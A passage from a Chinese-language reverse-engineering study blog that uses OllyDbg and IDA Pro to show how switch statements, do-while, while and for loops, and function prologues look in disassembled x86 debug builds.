<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    printf</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    printf</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    printf</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    </pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>在 <code>if/else语句</code> 中只有符合条件的时候才会执行，而在 <code>switch/case结构</code> 中则会顺序往下执行。</p>
<p>在 <code>ida</code>  中打开可以看到，这个程序是 <code>Debug版本</code> 的执行程序</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322195043108.png" alt="image-20220322195043108" /></p>
<p>双击 <code>_main_0</code>  进入主函数</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322195145412.png" alt="image-20220322195145412" /></p>
<p>可以更为直观的查看程序的执行结构。</p>
<p><code>f5</code>  查看代码，解析为 <code>if/else结构</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322195254760.png" alt="image-20220322195254760" /></p>
<h2 id="switch多分支识别"><a class="anchor" href="#switch多分支识别">#</a> switch 多分支识别</h2>
<p>进入 <code>主函数main</code>  进行断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322195455761.png" alt="image-20220322195455761" /></p>
<p><code>switch/case多分支结构</code> 不同于少分支结构的是：在多分支结构中会应用一个分支表</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">005</span>AA337   <span class="token operator">?</span>  <span class="token number">008</span>E A25A009D ADD BYTE PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>ESI<span class="token operator">+</span><span class="token number">9</span>D005AA2<span class="token punctuation">]</span><span class="token punctuation">,</span>CL</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">005</span>AA33D   <span class="token operator">?</span>  A2 <span class="token number">5</span>A00ACA2   MOV BYTE PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>A2AC005A<span class="token punctuation">]</span><span class="token punctuation">,</span>AL</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">005</span>AA342   <span class="token operator">?</span>  <span class="token number">5</span>A            POP EDX</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">005</span>AA343   <span class="token operator">?</span>  <span class="token number">00</span>BB A25A00CA ADD BYTE PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>EBX<span class="token operator">+</span>CA005AA2<span class="token punctuation">]</span><span class="token punctuation">,</span>BH</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">005</span>AA349   <span class="token operator">?</span>  A2 <span class="token number">5</span>A00D9A2   MOV BYTE PTR DS<span class="token operator">:</span><span class="token punctuation">[</span>A2D9005A<span class="token punctuation">]</span><span class="token punctuation">,</span>AL</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">005</span>AA34E   <span class="token operator">?</span>  <span class="token number">5</span>A            POP EDX</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322195703814.png" alt="image-20220322195703814" /></p>
<p>主函数分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322200942366.png" alt="image-20220322200942366" /></p>
<p>可以理解为：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>判断一下是否超出跳转范围，如果超出，则直接跳出分支，提高效率</pre></td></tr><tr><td data-num="2"></td><td><pre>如果没有超出跳转范围，就计算分支表的偏移，然后读取分支表所存储的地址</pre></td></tr></table></figure><p>在 <code>ida</code>  中打开如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322201233766.png" alt="image-20220322201233766" /></p>
<p>进入主函数显示如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322201306444.png" alt="image-20220322201306444" /></p>
<p>实现以上功能取决于 <code>switch/case</code>  中的 <code>case</code>  一定是整数</p>
<p><code>f5</code>  解析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220322201406590.png" alt="image-20220322201406590" /></p>
<p><strong>总结：</strong></p>
<p><code>switch/case</code>  多分支基于分支表，而分支表中储存的是地址，执行跳转的前提是 <code>case</code>  一定是<strong>整数</strong>。</p>
]]></content>
      <categories>
        <category>逆向工程</category>
      </categories>
      <tags>
        <tag>逆向工程</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向工程Studying Notes Days 6</title>
    <url>/article/5313226a.html</url>
    <content><![CDATA[<p>无语了，gitee 图床无了。。。。家被偷了，bbq 了，紧急抢救了一波，换了阿里云的 oss (・̀ ω・́)✧</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220325205846104.png" alt="image-20220325205846104" /></p>
<h1 id="三大循环结构解析"><a class="anchor" href="#三大循环结构解析">#</a> 三大循环结构解析</h1>
<h2 id="dowhile循环识别"><a class="anchor" href="#dowhile循环识别">#</a> dowhile 循环识别</h2>
<p>三大循环结构：</p>
<ul>
<li>while</li>
<li>dowhile</li>
<li>for</li>
</ul>
<p>这里我们从 dowhile 循环开始进行了解</p>
<p>dowhile 循环结构：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">do</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">code</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>n <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>执行顺序：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>先执行code</pre></td></tr><tr><td data-num="2"></td><td><pre>判断是否符合循环条件</pre></td></tr><tr><td data-num="3"></td><td><pre>    如果符合循环条件<span class="token operator">-</span>执行code</pre></td></tr><tr><td data-num="4"></td><td><pre>    如果不符合循环条件<span class="token operator">-</span>不执行code</pre></td></tr></table></figure><h3 id="主函数分析"><a class="anchor" href="#主函数分析">#</a> 主函数分析</h3>
<p>找到主函数，f2 进行断点，f9 执行到断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325154208962.png" alt="image-20220325154208962" /></p>
<p>主函数分析如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">00</span>DED3BE  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F8 <span class="token number">00000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span>               <span class="token punctuation">;</span>  初始化局部变量，<span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">00</span>DED3C5  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">8</span>B45 F8       <span class="token operator">/</span>MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>            <span class="token punctuation">;</span>  将局部变量的值赋值给eax，即eax <span class="token operator">=</span> flag</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">00</span>DED3C8  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            <span class="token operator">|</span>PUSH EAX</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">00</span>DED3C9  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">50</span>BEE700   <span class="token operator">|</span>PUSH <span class="token number">15</span>_dowhi<span class="token punctuation">.</span><span class="token number">00E7</span>BE50                  <span class="token punctuation">;</span>  ASCII "<span class="token operator">%</span>d</pre></td></tr><tr><td data-num="5"></td><td><pre>"</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">00</span>DED3CE  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 AECAFFFF   <span class="token operator">|</span>CALL <span class="token number">15</span>_dowhi<span class="token punctuation">.</span><span class="token number">00</span>DE9E81                  <span class="token punctuation">;</span>  格式化输出 printf</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">00</span>DED3D3  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       <span class="token operator">|</span>ADD ESP<span class="token punctuation">,</span><span class="token number">8</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">00</span>DED3D6  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 F8       <span class="token operator">|</span>MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>            <span class="token punctuation">;</span>  eax <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">00</span>DED3D9  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C0 <span class="token number">01</span>       <span class="token operator">|</span>ADD EAX<span class="token punctuation">,</span><span class="token number">1</span>                               <span class="token punctuation">;</span>  eax <span class="token operator">=</span> eax <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">00</span>DED3DC  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8945</span> F8       <span class="token operator">|</span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EAX            <span class="token punctuation">;</span>  flag <span class="token operator">=</span> eax</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">00</span>DED3DF  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">837</span>D F8 <span class="token number">64</span>    <span class="token operator">|</span>CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">64</span>             <span class="token punctuation">;</span>  判断是否大于<span class="token number">64</span>，如果大于则顺序执行跳出循环，否则通过jl进行跳转</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">00</span>DED3E3  <span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">^</span> <span class="token number">7</span>C E0         \JL SHORT <span class="token number">15</span>_dowhi<span class="token punctuation">.</span><span class="token number">00</span>DED3C5</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325155047263.png" alt="image-20220325155047263" /></p>
<p>同时如果 <code>CMP DWORD PTR SS:[EBP-8],64</code>  中 <code>EBP-8</code>  大于 <code>0x64</code>  那么就跳出循环，测试 <code>eax = 100</code></p>
<p>还原为 C 语言结构：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">do</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    flag <span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>flag <span class="token operator">></span> <span class="token number">0x64</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>ida pro 中显示：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325155539183.png" alt="image-20220325155539183" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325155558023.png" alt="image-20220325155558023" /></p>
<p>f5 跟进：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325155612283.png" alt="image-20220325155612283" /></p>
<h2 id="while循环结构解析"><a class="anchor" href="#while循环结构解析">#</a> while 循环结构解析</h2>
<p>主函数断点，f9 执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220325155720687.png" alt="image-20220325155720687" /></p>
<p>while 循环结构：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>flag <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">code</span></span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>xxxx</pre></td></tr></table></figure><p>不同于 dowhile 结构的是：dowhile 是先执行再判断，而 while 是先判断再执行</p>
<h3 id="主函数分析-2"><a class="anchor" href="#主函数分析-2">#</a> 主函数分析</h3>
<p>找到 main 函数断点分析</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220325203731330.png" alt="image-20220325203731330" /></p>
<p>分析如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">001F</span>D3BE  <span class="token operator">|</span><span class="token punctuation">.</span>  C745 F8 <span class="token number">00000</span><span class="token operator">></span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span>               <span class="token punctuation">;</span>  局部变量 flag <span class="token operator">=</span> <span class="token number">0</span> 也即：用户代码的入口点</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">001F</span>D3C5  <span class="token operator">|</span><span class="token operator">></span>  <span class="token number">837</span>D F8 <span class="token number">64</span>    <span class="token operator">/</span>CMP DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">64</span>             <span class="token punctuation">;</span>  对比flag和<span class="token number">0x64</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">001F</span>D3C9  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">7</span>D <span class="token number">1</span>C         <span class="token operator">|</span>JGE SHORT <span class="token number">16</span>_while<span class="token punctuation">.</span><span class="token number">001F</span>D3E7             <span class="token punctuation">;</span>  jge大于等于就跳转，判断的是flag<span class="token operator">>=</span><span class="token number">0x64</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">001F</span>D3CB  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 F8       <span class="token operator">|</span>MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>            <span class="token punctuation">;</span>  eax <span class="token operator">=</span> flag eax <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">001F</span>D3CE  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">50</span>            <span class="token operator">|</span>PUSH EAX</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">001F</span>D3CF  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">68</span> <span class="token number">50</span>BE2800   <span class="token operator">|</span>PUSH <span class="token number">16</span>_while<span class="token punctuation">.</span><span class="token number">0028</span>BE50                  <span class="token punctuation">;</span>  ASCII <span class="token string">"%d"</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">001F</span>D3D4  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 A8CAFFFF   <span class="token operator">|</span>CALL <span class="token number">16</span>_while<span class="token punctuation">.</span><span class="token number">001F</span><span class="token number">9E81</span>                  <span class="token punctuation">;</span>  printf</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">001F</span>D3D9  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C4 <span class="token number">08</span>       <span class="token operator">|</span>ADD ESP<span class="token punctuation">,</span><span class="token number">8</span>                               <span class="token punctuation">;</span>  堆栈平衡</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">001F</span>D3DC  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>B45 F8       <span class="token operator">|</span>MOV EAX<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span>            <span class="token punctuation">;</span>  eax <span class="token operator">=</span> flag eax <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">001F</span>D3DF  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">83</span>C0 <span class="token number">01</span>       <span class="token operator">|</span>ADD EAX<span class="token punctuation">,</span><span class="token number">1</span>                               <span class="token punctuation">;</span>  eax <span class="token operator">=</span> eax <span class="token operator">+</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">001F</span>D3E2  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8945</span> F8       <span class="token operator">|</span>MOV DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span>EAX            <span class="token punctuation">;</span>  flag <span class="token operator">=</span> eax flag <span class="token operator">=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">001F</span>D3E5  <span class="token operator">|</span><span class="token punctuation">.</span><span class="token operator">^</span> EB DE         \JMP SHORT <span class="token number">16</span>_while<span class="token punctuation">.</span><span class="token number">001F</span>D3C5</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220325204447887.png" alt="image-20220325204447887" /></p>
<p>C 语言格式：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>flag <span class="token operator">&lt;=</span> <span class="token number">0x64</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    printf</pre></td></tr><tr><td data-num="5"></td><td><pre>    flag <span class="token operator">++</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>ida pro 打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220325205520592.png" alt="image-20220325205520592" /></p>
<p>main 函数跟进</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220325205542123.png" alt="image-20220325205542123" /></p>
<p>f5 反编译如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220325205603276.png" alt="image-20220325205603276" /></p>
<h2 id="for循环结构解析"><a class="anchor" href="#for循环结构解析">#</a> for 循环结构解析</h2>
<p>for 循环是平时编程中最常用的循环结构，它比 while 和 dowhile 循环更加灵活方便。</p>
<h3 id="主函数分析-3"><a class="anchor" href="#主函数分析-3">#</a> 主函数分析</h3>
<p>主函数断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220325205027792.png" alt="image-20220325205027792" /></p>
<p>主函数分析如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220325205345042.png" alt="image-20220325205345042" /></p>
<p>ida pro 打开</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220325205643359.png" alt="image-20220325205643359" /></p>
<p>main 函数跟进</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220325205709437.png" alt="image-20220325205709437" /></p>
<p>f5 反编译</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220325205724569.png" alt="image-20220325205724569" /></p>
<h1 id="函数分析"><a class="anchor" href="#函数分析">#</a> 函数分析</h1>
<p>OD 打开找到 main 函数，f2 断点，f9 执行</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220326165725506.png" alt="image-20220326165725506" /></p>
<p>函数初始化部分：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0103</span>D3F0  <span class="token operator">/</span><span class="token operator">></span> \<span class="token number">55</span>            PUSH EBP</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">0103</span>D3F1  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0103</span>D3F3  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">81</span>EC C0000000 SUB ESP<span class="token punctuation">,</span><span class="token number">0</span>C0</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0103</span>D3F9  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">53</span>            PUSH EBX</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0103</span>D3FA  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">56</span>            PUSH ESI</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0103</span>D3FB  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">57</span>            PUSH EDI</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0103</span>D3FC  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>DBD <span class="token number">40FFFF</span>FF LEA EDI<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C0<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0103</span>D402  <span class="token operator">|</span><span class="token punctuation">.</span>  B9 <span class="token number">30000000</span>   MOV ECX<span class="token punctuation">,</span><span class="token number">30</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0103</span>D407  <span class="token operator">|</span><span class="token punctuation">.</span>  B8 CCCCCCCC   MOV EAX<span class="token punctuation">,</span>CCCCCCCC</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0103</span>D40C  <span class="token operator">|</span><span class="token punctuation">.</span>  F3<span class="token operator">:</span>AB         REP STOS DWORD PTR ES<span class="token operator">:</span><span class="token punctuation">[</span>EDI<span class="token punctuation">]</span></pre></td></tr></table></figure><p>函数退出前的清理程序：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0103</span>D427  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">33</span>C0          XOR EAX<span class="token punctuation">,</span>EAX</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">0103</span>D429  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5F</span>            POP EDI</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0103</span>D42A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>E            POP ESI</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0103</span>D42B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>B            POP EBX</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0103</span>D42C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">81</span>C4 C0000000 ADD ESP<span class="token punctuation">,</span><span class="token number">0</span>C0</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0103</span>D432  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">3</span>BEC          CMP EBP<span class="token punctuation">,</span>ESP</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0103</span>D434  <span class="token operator">|</span><span class="token punctuation">.</span>  E8 <span class="token number">8</span>BAFFFFF   CALL <span class="token number">18</span>_函数<span class="token operator">?</span><span class="token number">010383</span>C4</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0103</span>D439  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BE5          MOV ESP<span class="token punctuation">,</span>EBP</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">0103</span>D43B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">5</span>D            POP EBP</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">0103</span>D43C  \<span class="token punctuation">.</span>  C3            RETN</pre></td></tr></table></figure><p>f9 执行到断点</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220326170058774.png" alt="image-20220326170058774" /></p>
<p>f7 进入，f8 跳转</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20220326170128727.png" alt="image-20220326170128727" /></p>
<p>进入 add 函数模块</p>
<p>分析如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">0103</span>D300  <span class="token operator">/</span><span class="token operator">></span> \<span class="token number">55</span>            PUSH EBP                                 <span class="token punctuation">;</span>  保存栈底指针</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">0103</span>D301  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>BEC          MOV EBP<span class="token punctuation">,</span>ESP                              <span class="token punctuation">;</span>  保存栈顶指针，把esp的值给ebp</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">0103</span>D303  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">81</span>EC C0000000 SUB ESP<span class="token punctuation">,</span><span class="token number">0</span>C0                              <span class="token punctuation">;</span>  抬高栈顶<span class="token number">0</span>C0长度，esp和ebp之间又有了<span class="token number">0</span>C0长度的新空间</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">0103</span>D309  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">53</span>            PUSH EBX                                 <span class="token punctuation">;</span>  可能会用到的寄存器，先保存原值</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">0103</span>D30A  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">56</span>            PUSH ESI</pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">0103</span>D30B  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">57</span>            PUSH EDI</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">0103</span>D30C  <span class="token operator">|</span><span class="token punctuation">.</span>  <span class="token number">8</span>DBD <span class="token number">40FFFF</span>FF LEA EDI<span class="token punctuation">,</span>DWORD PTR SS<span class="token operator">:</span><span class="token punctuation">[</span>EBP<span class="token operator">-</span>C0<span class="token punctuation">]</span>            <span class="token punctuation">;</span>  取地址存到edi中，就是新的栈的首地址给edi</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">0103</span>D312  <span class="token operator">|</span><span class="token punctuation">.</span>  B9 <span class="token number">30000000</span>   MOV ECX<span class="token punctuation">,</span><span class="token number">30</span>                               <span class="token punctuation">;</span>  ecx <span class="token operator">=</span> <span class="token 